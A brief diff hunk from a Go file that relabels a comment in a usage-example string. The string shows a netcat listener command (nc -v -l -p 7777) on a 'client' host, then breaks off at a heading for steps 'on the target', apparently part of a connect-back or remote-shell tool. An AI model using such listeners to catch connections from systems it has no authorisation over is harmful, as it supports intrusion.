@@ -12,7 +12,7 @@ import (
 )
 
 const (
-	tcpListenerExample = `# On the master (1.2.3.4)
+	tcpListenerExample = `# On the client (1.2.3.4)
 $ nc -v -l -p 7777
 
 # On the target
